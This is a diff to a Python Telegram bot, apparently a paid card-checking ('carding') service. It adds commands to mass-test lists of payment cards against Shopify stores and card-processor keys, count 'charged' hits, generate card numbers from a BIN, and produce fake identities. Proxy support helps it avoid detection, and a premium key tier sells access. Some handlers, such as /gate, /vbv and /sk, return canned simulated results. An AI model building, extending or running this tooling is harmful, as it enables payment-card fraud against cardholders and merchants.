@@ -57,10 +57,17 @@ def get_ua(): return random.choice(USER_AGENTS)
 joined_cache = {}
 CACHE_DURATION = 300 
 
-def check_and_reset_credits(user_id):
+def init_user(user_id, username="None"):
     if user_id not in users_db:
-        users_db[user_id] = {"tier": "free", "credits": 10, "last_reset": str(datetime.date.today()), "proxy": None}
-    user = users_db[user_id]
+        users_db[user_id] = {
+            "tier": "free", "credits": 10, "last_reset": str(datetime.date.today()), 
+            "proxy": None, "username": username,
+            "stats": {"checked": 0, "charged": 0, "approved": 0, "declined": 0, "stripe": 0, "jio": 0, "magicpin": 0, "b3": 0, "whop": 0}
+        }
+    return users_db[user_id]
+
+def check_and_reset_credits(user_id):
+    user = init_user(user_id)
     if user.get("tier") == "free" and user.get("last_reset") != str(datetime.date.today()):
         user["credits"] = 10
         user["last_reset"] = str(datetime.date.today())
@@ -121,6 +128,18 @@ def generate_cc(bin_str: str):
             break
     return f"{generated}|{str(random.randint(1, 12)).zfill(2)}|{str(random.randint(2025, 2032))[-2:]}|{random.randint(100, 999)}"
 
+def fake_address_gen():
+    first_names = ["James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda"]
+    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"]
+    streets = ["Oak St", "Maple Ave", "Cedar Ln", "Pine St", "Elm St", "Washington Ave"]
+    cities = [("New York", "NY", "10001"), ("Los Angeles", "CA", "90001"), ("Chicago", "IL", "60601"), ("Houston", "TX", "77001")]
+    
+    name = f"{random.choice(first_names)} {random.choice(last_names)}"
+    street = f"{random.randint(100, 9999)} {random.choice(streets)}"
+    city, state, zip_code = random.choice(cities)
+    
+    return f"Name: {name}\nAddress: {street}, {city}, {state} {zip_code}\nPhone: {random.randint(200, 999)}-{random.randint(100, 999)}-{random.randint(1000, 9999)}"
+
 async def shopify_check(session: aiohttp.ClientSession, site: str, card: str, proxy: str = None) -> dict:
     params = {"site": site, "cc": card, "key": "user1"}
     if proxy: params["proxy"] = proxy
@@ -149,11 +168,11 @@ def send_hit_alert(user, card, gateway, response, price="Unknown"):
 
 def set_bot_commands():
     commands = [
-        BotCommand("start", "Start the bot"), BotCommand("info", "Show full guide"), BotCommand("profile", "View profile & plan"),
-        BotCommand("sh", "Shopify Check (Single)"), BotCommand("autohit", "Auto-Hitter (Premium)"), BotCommand("skcheck", "Shadow Live Auth"),
-        BotCommand("msk", "Mass Shadow Live"), BotCommand("plans", "View Premium Plans"), BotCommand("redeem", "Redeem a Key"),
-        BotCommand("proxy", "Add Proxy"), BotCommand("rmproxy", "Remove Proxy"), BotCommand("bin", "BIN Lookup"),
-        BotCommand("gen", "CC Generation"), BotCommand("fake", "Fake Address"), BotCommand("gate", "Detect Gateway"),
+        BotCommand("start", "Start the bot"), BotCommand("me", "View your full stats"), BotCommand("info", "Show guide"),
+        BotCommand("profile", "View profile & plan"), BotCommand("sh", "Shopify Check"), BotCommand("autohit", "Auto-Hitter (Premium)"),
+        BotCommand("skcheck", "Shadow Live Auth"), BotCommand("msk", "Mass Shadow Live"), BotCommand("plans", "View Premium Plans"),
+        BotCommand("redeem", "Redeem a Key"), BotCommand("proxy", "Add Proxy"), BotCommand("rmproxy", "Remove Proxy"),
+        BotCommand("bin", "BIN Lookup"), BotCommand("gen", "CC Generation"), BotCommand("fake", "Fake Address"), BotCommand("gate", "Detect Gateway"),
         BotCommand("vbv", "VBV Lookup"), BotCommand("sk", "Shadow Key Check"), BotCommand("ping", "Check Bot Status")
     ]
     bot.set_my_commands(commands)
@@ -186,14 +205,135 @@ def callback_back_plans(call: CallbackQuery):
 @bot.message_handler(commands=['start'])
 def cmd_start(message: Message):
     if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
-    if message.from_user.id not in users_db: users_db[message.from_user.id] = {"tier": "free", "credits": 10, "last_reset": str(datetime.date.today()), "username": f"@{message.from_user.username}" if message.from_user.username else "None", "proxy": None}
+    init_user(message.from_user.id, f"@{message.from_user.username}" if message.from_user.username else "None")
     bot.reply_to(message, "💳 **Welcome to 𝙃𝙞𝙩𝙊𝙭 | 𝙫1**\n\nUse /info to see how to use the bot.", parse_mode="Markdown")
+
+@bot.message_handler(commands=['me', 'stats'])
+def cmd_me(message: Message):
+    if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
+    uid = message.from_user.id
+    user = init_user(uid, f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name)
+    s = user.get("stats", {})
+    text = (f"⚡ **Your Stats** ✅\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n💎 **Total Checked :** {s.get('checked', 0)}\n💸 **Total Charged :** {s.get('charged', 0)}\n✅ **Total Approved :** {s.get('approved', 0)}\n❌ **Total Declined :** {s.get('declined', 0)}\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n✨ **Stripe Hits :** {s.get('stripe', 0)}\n✨ **Jio Hits :** {s.get('jio', 0)}\n✨ **Magicpin Hits :** {s.get('magicpin', 0)}\n✨ **B3 Hits :** {s.get('b3', 0)}\n✨ **Whop Hits :** {s.get('whop', 0)}\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n♾️ **User :** {user.get('username')}")
+    bot.reply_to(message, text, parse_mode="Markdown")
 
 @bot.message_handler(commands=['info', 'help'])
 def cmd_info(message: Message):
     if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
-    info_text = ("📖 **Bot Commands Guide**\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n\n💳 **/sh [card]**\n├ Use: Check single card on Shopify.\n└ Ex: `/sh 4111...|12|25|123`\n\n🚀 **/autohit (Premium)**\n├ Use: Reply to a list of cards to mass hit.\n\n🔑 **/skcheck [sk] [card]**\n├ Use: Check card on Shadow Live.\n\n👤 **/profile**\n├ Use: Check plan, credits, expiry & proxy.\n\n💎 **/plans**\n├ Use: View and buy premium plans.\n\n🔍 **/bin [bin]**\n├ Use: Get bank info.\n\n🏓 **/ping**\n├ Use: Check bot status.")
+    info_text = ("📖 **Bot Commands Guide**\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n\n💳 **/sh [card]**\n├ Use: Check single card.\n\n🚀 **/autohit (Premium)**\n├ Use: Reply to a list of cards.\n\n📊 **/me**\n├ Use: Check your stats.\n\n👤 **/profile**\n├ Use: Check plan & proxy.\n\n🌐 **/proxy [ip:port]**\n├ Use: Add proxy.\n\n🏠 **/fake**\n├ Use: Generate fake identity.\n\n🔍 **/bin [bin]**\n├ Use: Get bank info.\n\n💳 **/gate [site]**\n├ Use: Detect gateway.\n\n⚙️ **/gen [bin]**\n├ Use: Generate CCs.\n\n🔐 **/vbv [card]**\n├ Use: Check VBV.\n\n🏓 **/ping**\n├ Use: Check bot status.")
     bot.reply_to(message, info_text, parse_mode="Markdown")
+
+@bot.message_handler(commands=['fake'])
+def cmd_fake(message: Message):
+    if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
+    bot.reply_to(message, f"🏠 **Fake Identity**\n\n{fake_address_gen()}", parse_mode="Markdown")
+
+@bot.message_handler(commands=['sk'])
+def cmd_sk(message: Message):
+    if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
+    args = message.text.split(maxsplit=1)
+    if len(args) < 2: return bot.reply_to(message, "Usage: `/sk shadow_live`")
+    if args[1].startswith("shadow_live"): bot.reply_to(message, "🔑 **Status:** `LIVE KEY`\n(Simulated: $1,250.00)", parse_mode="Markdown")
+    else: bot.reply_to(message, "🔑 **Status:** `Invalid Key`", parse_mode="Markdown")
+
+@bot.message_handler(commands=['gate'])
+def cmd_gate(message: Message):
+    if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
+    args = message.text.split(maxsplit=1)
+    if len(args) < 2: return bot.reply_to(message, "Usage: `/gate example.com`")
+    # Placeholder for gate detection
+    bot.reply_to(message, f"🌐 **Target:** `{args[1]}`\n💳 **Gateway:** `Shopify`", parse_mode="Markdown")
+
+@bot.message_handler(commands=['vbv'])
+def cmd_vbv(message: Message):
+    if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
+    args = message.text.split(maxsplit=1)
+    if len(args) < 2: return bot.reply_to(message, "Usage: `/vbv 4111...`")
+    bot.reply_to(message, f"🔐 **Lookup:** `{args[1]}`\nNon-VBV (Bypass Available)", parse_mode="Markdown")
+
+@bot.message_handler(commands=['autohit'])
+def cmd_autohit(message: Message):
+    if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
+    if not is_premium(message.from_user.id): return bot.reply_to(message, "❌ Premium required.")
+    if not message.reply_to_message or not message.reply_to_message.text:
+        return bot.reply_to(message, "❌ Reply to a message with cards.\nFormat:\n`[shadow_live] | [shopify_site] | [card1]`", parse_mode="Markdown")
+    lines = [line.strip() for line in message.reply_to_message.text.splitlines() if "|" in line]
+    if not lines: return bot.reply_to(message, "❌ Invalid format.")
+    parts = [p.strip() for p in lines[0].split("|")]
+    sk_key, site, cards = parts[0], parts[1], parts[2:]
+    if len(cards) > 10: return bot.reply_to(message, "❌ Max 10 cards.")
+    msg = bot.reply_to(message, f"🚀 **Auto-Hitter Started**\nTarget: `{site}`\nCards: `{len(cards)}`", parse_mode="Markdown")
+    async def _run_autohit():
+        results = []
+        connector = aiohttp.TCPConnector(limit=20)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            async def check_single_card(card):
+                sk_res = await sk_base_check(session, sk_key, card)
+                if isinstance(sk_res, dict) and "error" not in sk_res:
+                    status = sk_res.get("status", "UNKNOWN")
+                    if status in ["succeeded", "live", "CHARGED"]:
+                        hits.append((card, "SHADOW_API", status))
+                        return f"🔥 `{card}` -> CHARGED (Shadow)"
+                if site.lower() not in ["none", "-"]:
+                    shop_res = await shopify_check(session, site, card)
+                    if isinstance(shop_res, dict) and "error" not in shop_res:
+                        resp_text = shop_res.get("Response", "UNKNOWN")
+                        if resp_text == "ORDER_PAID":
+                            price = f"{shop_res.get('Price', '')} {shop_res.get('Currency', '')}".strip()
+                            send_hit_alert(message.from_user, card, "Shopify", resp_text, price)
+                            return f"🔥 `{card}` -> ORDER_PAID (Shopify)"
+                        elif resp_text == "3DS_REQUIRED": return f"⚠️ `{card}` -> 3DS_REQUIRED"
+                        else: return f"❌ `{card}` -> {resp_text}"
+                return f"❌ `{card}` -> Dead/Declined"
+            hits = []
+            tasks = [check_single_card(card) for card in cards]
+            for res in await asyncio.gather(*tasks): results.append(res)
+        final = ("🏆 **HIT FOUND** 🏆\n\n" if hits else "❌ **NO HITS** ❌\n\n") + "\n".join(results)
+        bot.edit_message_text(final, message.chat.id, msg.message_id, parse_mode="Markdown")
+    asyncio.run(_run_autohit())
+
+@bot.message_handler(commands=['skcheck'])
+def cmd_skcheck(message: Message):
+    if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
+    args = message.text.split(maxsplit=2)
+    if len(args) < 3: return bot.reply_to(message, "Usage: `/skcheck [shadow_live] [CARD|MM|YYYY|CVV]`", parse_mode="Markdown")
+    sk_key, card = args[1].strip(), args[2].strip()
+    msg = bot.reply_to(message, f"🔑 **Checking...**\nCard: `{card}`", parse_mode="Markdown")
+    async def _check():
+        async with aiohttp.ClientSession() as session:
+            res = await sk_base_check(session, sk_key, card)
+            if "error" in res: return bot.edit_message_text(f"❌ **Error:** {res['error']}", message.chat.id, msg.message_id)
+            output = f"🔑 **Result**\n💳 **Card:** `{card}`\n"
+            for key, value in res.items(): output += f"📌 **{key.capitalize()}:** `{value}`\n"
+            bot.edit_message_text(output, message.chat.id, msg.message_id, parse_mode="Markdown")
+    asyncio.run(_check())
+
+@bot.message_handler(commands=['msk'])
+def cmd_msk(message: Message):
+    if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
+    if not is_premium(message.from_user.id): return bot.reply_to(message, "❌ Premium required.")
+    args = message.text.split(maxsplit=1)
+    if len(args) < 2: return bot.reply_to(message, "Usage: Reply to cards with `/msk [shadow_live]`", parse_mode="Markdown")
+    sk_key = args[1].strip()
+    if not message.reply_to_message or not message.reply_to_message.text: return bot.reply_to(message, "❌ Reply to cards.")
+    cards = [c.strip() for c in message.reply_to_message.text.splitlines() if "|" in c]
+    if not cards: return bot.reply_to(message, "❌ No valid cards found.")
+    if len(cards) > 10: return bot.reply_to(message, "❌ Max 10 cards.")
+    msg = bot.reply_to(message, f"🔄 **Mass Check**\nCards: `{len(cards)}`\nDelay: 13s per card.", parse_mode="Markdown")
+    async def _mass():
+        results = []
+        async with aiohttp.ClientSession() as session:
+            for idx, card in enumerate(cards, 1):
+                bot.edit_message_text(f"🔄 **Processing** `{idx}/{len(cards)}`\nLast: `{results[-1] if results else '...'}`", message.chat.id, msg.message_id, parse_mode="Markdown")
+                res = await sk_base_check(session, sk_key, card)
+                if "error" in res and res["error"] == "Rate Limit Exceeded":
+                    await asyncio.sleep(15)
+                    res = await sk_base_check(session, sk_key, card)
+                if "error" in res: results.append(f"❌ `{card}` -> {res['error']}")
+                else: results.append(f"✅ `{card}` -> `{res.get('status', 'UNKNOWN')}`")
+                await asyncio.sleep(13)
+        bot.edit_message_text(f"📊 **Mass Results**\n\n" + "\n".join(results), message.chat.id, msg.message_id, parse_mode="Markdown")
+    asyncio.run(_mass())
 
 @bot.message_handler(commands=['plans'])
 def cmd_plans(message: Message):
@@ -212,7 +352,8 @@ def cmd_proxy(message: Message):
     if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
     args = message.text.split(maxsplit=1)
     if len(args) < 2: return bot.reply_to(message, "Usage: `/proxy ip:port`")
-    users_db.setdefault(message.from_user.id, {})["proxy"] = args[1].strip()
+    user = init_user(message.from_user.id)
+    user["proxy"] = args[1].strip()
     bot.reply_to(message, f"✅ **Proxy Added!**\n`{args[1].strip()}`", parse_mode="Markdown")
 
 @bot.message_handler(commands=['rmproxy'])
@@ -270,10 +411,11 @@ def cmd_redeem(message: Message):
     if key in keys_db:
         key_data = keys_db[key]
         if key_data["slots_left"] <= 0: return bot.reply_to(message, "❌ Max redeem limit reached.")
-        users_db.setdefault(message.from_user.id, {})["tier"] = "premium"
-        curr_exp = users_db[message.from_user.id].get("expiry", 0)
+        user = init_user(message.from_user.id)
+        user["tier"] = "premium"
+        curr_exp = user.get("expiry", 0)
         days = key_data["days"]
-        users_db[message.from_user.id]["expiry"] = (curr_exp + (days * 86400)) if curr_exp > time.time() else (time.time() + (days * 86400))
+        user["expiry"] = (curr_exp + (days * 86400)) if curr_exp > time.time() else (time.time() + (days * 86400))
         keys_db[key]["slots_left"] -= 1
         bot.reply_to(message, f"✅ **Key Redeemed!**\nUnlocked **{key_data['plan']}** for **{days} days**.")
     else: bot.reply_to(message, "❌ Invalid or used key.")
@@ -283,27 +425,39 @@ def cmd_sh(message: Message):
     is_group = message.chat.type in ['group', 'supergroup']
     if not is_group and not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
     check_and_reset_credits(message.from_user.id)
-    user = users_db.get(message.from_user.id, {"tier": "free", "credits": 10})
+    user = init_user(message.from_user.id)
     if not is_premium(message.from_user.id) and user.get("credits", 0) <= 0: return bot.reply_to(message, "❌ **Daily limit reached!**\nBuy premium.")
     args = message.text.split(maxsplit=1)
     if len(args) < 2: return bot.reply_to(message, "Usage: `/sh CARD|MM|YY|CVV`")
     card = args[1].strip()
     if "|" not in card: return bot.reply_to(message, "❌ Invalid format.")
+    
     if not is_premium(message.from_user.id): user["credits"] = user.get("credits", 10) - 1
+    user["stats"]["checked"] = user["stats"].get("checked", 0) + 1
     user_proxy = user.get("proxy", None)
-    msg = bot.reply_to(message, f"**CARD × CHK**\n──────────────────\n**{message.from_user.first_name}**\n`/sh {card}`\n**#Shopify [/sh]**\n🌐 Proxy: `{user_proxy or 'None'}`\n━━━━━━━━━━━━━━━━━━\n[⚡] **Gate :** ⚙️ Shopify\n[⚡] **Progress :** 0/1\n[⚡] **Charged :** 0 💎\n[⚡] **Live :** 0 ✅\n[⚡] **Dead :** 0 ❌\n[⚡] **Errors :** 0 ⚠️", parse_mode="Markdown")
+    
+    msg = bot.reply_to(message, f"**𝙃𝙞𝙩𝙊𝙭 | 𝙫1**\n──────────────────\n**{message.from_user.first_name}**\n`/sh {card}`\n**#Shopify [/sh]**\n🌐 Proxy: `{user_proxy or 'None'}`\n━━━━━━━━━━━━━━━━━━\n[⚡] **Gate :** ⚙️ Shopify\n[⚡] **Progress :** 0/1\n[⚡] **Charged :** 0 💎\n[⚡] **Live :** 0 ✅\n[⚡] **Dead :** 0 ❌\n[⚡] **Errors :** 0 ⚠️", parse_mode="Markdown")
+    
     async def _run():
         async with aiohttp.ClientSession() as session:
             res = await shopify_check(session, "auto", card, proxy=user_proxy)
-            if "error" in res: await bot.edit_message_text(msg.text.replace("0/1", "1/1").replace("Errors : 0 ⚠️", "Errors : 1 ⚠️"), message.chat.id, msg.message_id, parse_mode="Markdown")
+            if "error" in res:
+                user["stats"]["declined"] = user["stats"].get("declined", 0) + 1
+                await bot.edit_message_text(msg.text.replace("0/1", "1/1").replace("Errors : 0 ⚠️", "Errors : 1 ⚠️"), message.chat.id, msg.message_id, parse_mode="Markdown")
             else:
                 resp_text = res.get("Response", "UNKNOWN")
                 if resp_text == "ORDER_PAID":
+                    user["stats"]["charged"] = user["stats"].get("charged", 0) + 1
+                    user["stats"]["stripe"] = user["stats"].get("stripe", 0) + 1
                     price = f"{res.get('Price', '')} {res.get('Currency', '')}".strip()
                     send_hit_alert(message.from_user, card, "Shopify", resp_text, price)
                     await bot.edit_message_text(msg.text.replace("0/1", "1/1").replace("Charged : 0 💎", "Charged : 1 💎"), message.chat.id, msg.message_id, parse_mode="Markdown")
-                elif resp_text == "3DS_REQUIRED": await bot.edit_message_text(msg.text.replace("0/1", "1/1").replace("Live : 0 ✅", "Live : 1 ✅"), message.chat.id, msg.message_id, parse_mode="Markdown")
-                else: await bot.edit_message_text(msg.text.replace("0/1", "1/1").replace("Dead : 0 ❌", "Dead : 1 ❌"), message.chat.id, msg.message_id, parse_mode="Markdown")
+                elif resp_text == "3DS_REQUIRED": 
+                    user["stats"]["approved"] = user["stats"].get("approved", 0) + 1
+                    await bot.edit_message_text(msg.text.replace("0/1", "1/1").replace("Live : 0 ✅", "Live : 1 ✅"), message.chat.id, msg.message_id, parse_mode="Markdown")
+                else: 
+                    user["stats"]["declined"] = user["stats"].get("declined", 0) + 1
+                    await bot.edit_message_text(msg.text.replace("0/1", "1/1").replace("Dead : 0 ❌", "Dead : 1 ❌"), message.chat.id, msg.message_id, parse_mode="Markdown")
     asyncio.run(_run())
 
 @bot.message_handler(commands=['bin'])
@@ -331,6 +485,6 @@ def cmd_gen(message: Message):
 
 if __name__ == "__main__":
     print("[*] Bot starting with Web Server...")
-    keep_alive() # Start Flask server for Render
+    keep_alive() 
     set_bot_commands()
     bot.infinity_polling(timeout=5, long_polling_timeout=2)
